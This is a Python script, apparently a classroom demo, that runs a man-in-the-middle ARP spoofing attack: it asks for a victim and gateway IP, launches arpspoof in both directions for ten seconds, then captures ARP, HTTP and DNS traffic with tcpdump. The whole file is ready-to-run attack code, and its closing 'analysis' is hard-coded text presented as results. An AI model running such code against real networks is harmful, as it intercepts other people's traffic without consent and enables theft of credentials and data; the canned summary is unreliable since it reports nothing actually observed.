import os
import time
import subprocess

# Get victim and gateway IPs from the user
victim_ip = input("Enter the victim's IP address: ")
gateway_ip = input("Enter the gateway's IP address: ")

# Inform the student that ARP spoofing is starting
print("""
   ┌───────────────────────────────────────────────────┐
   │               MITM Attack - ARP Spoofing          │
   └───────────────────────────────────────────────────┘
""")
print(f"\nStarting ARP spoofing for 10 seconds...")

# Spoof victim pretending to be the gateway
spoof_victim_command = f"arpspoof -i eth0 -t {victim_ip} {gateway_ip}"
print(f"🛑 Running command to spoof Victim IP {victim_ip}:")
print(f"   {spoof_victim_command}")
spoof_victim_process = subprocess.Popen(spoof_victim_command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Spoof gateway pretending to be the victim
spoof_gateway_command = f"arpspoof -i eth0 -t {gateway_ip} {victim_ip}"
print(f"\n🔄 Running command to spoof Gateway IP {gateway_ip}:")
print(f"   {spoof_gateway_command}")
spoof_gateway_process = subprocess.Popen(spoof_gateway_command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Run ARP spoofing for 10 seconds
time.sleep(10)

# Stop ARP spoofing after 10 seconds
print("\n❌ Stopping ARP spoofing after 10 seconds.")
spoof_victim_process.terminate()
spoof_gateway_process.terminate()

# Print any errors from arpspoof
victim_out, victim_err = spoof_victim_process.communicate()
gateway_out, gateway_err = spoof_gateway_process.communicate()

if victim_err:
    print(f"Error in victim arpspoof: {victim_err.decode()}")
if gateway_err:
    print(f"Error in gateway arpspoof: {gateway_err.decode()}")

# Start tcpdump to capture and filter ARP packets
print("\n📡 Capturing and analyzing ARP traffic in real-time with tcpdump:")
tcpdump_command = f"tcpdump -i eth0 'arp or port 80 or port 53' -q -n -A -s 0 -c 10"
print(f"   {tcpdump_command}")
tcpdump_process = subprocess.Popen(tcpdump_command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Capture tcpdump output
tcpdump_output, tcpdump_err = tcpdump_process.communicate()

# Print tcpdump output
print("\n📄 TCPDUMP OUTPUT:")
print(tcpdump_output.decode())

# Print any tcpdump errors
if tcpdump_err:
    print(f"Error in tcpdump: {tcpdump_err.decode()}")

# Simulated final analysis (ASCII/CLI-based)
print("\n✅ ARP spoofing analysis completed. Here's a summary:")

# Display a simulated ASCII network flow diagram and summary
print("""
   ┌───────────────────────────────────────────────────┐
   │                NETWORK FLOW SUMMARY               │
   └───────────────────────────────────────────────────┘
                Attacker             Victim
             [ATTACKER IP]   <───>  [VICTIM IP]
             Spoofing Gateway IP: [GATEWAY IP]

  ARP Spoofing in action:
  - The attacker is pretending to be the gateway.
  - The victim is fooled into sending traffic to the attacker.

   ┌───────────────────────────────────────────────────┐
   │        ARP Spoofing Detected in ARP Responses     │
   └───────────────────────────────────────────────────┘
  Example:
  Who has [GATEWAY IP]? Tell [VICTIM IP] -> Attacker MAC
  Who has [VICTIM IP]? Tell [GATEWAY IP] -> Attacker MAC

  Network traffic was captured and spoofed ARP replies were detected.
  """)
